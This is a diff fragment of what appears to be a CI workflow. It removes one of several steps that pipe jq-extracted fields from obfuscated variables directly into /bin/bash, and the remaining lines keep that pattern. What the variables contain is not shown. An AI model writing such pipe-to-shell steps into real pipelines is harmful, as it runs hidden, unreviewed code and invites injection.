@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$xjkuh1408" | jq -r .rfzv6 | /bin/bash
           echo $i4520 | jq -r .fb8060 | /bin/bash
           echo $zzvbn6363 | jq -r .mw2 | /bin/bash
-          echo $lkn60 | jq -r .jkl74569 | /bin/bash
           printf '%s' "$bh12" | jq -r .g8833 | /bin/bash
 
       - name: Store output
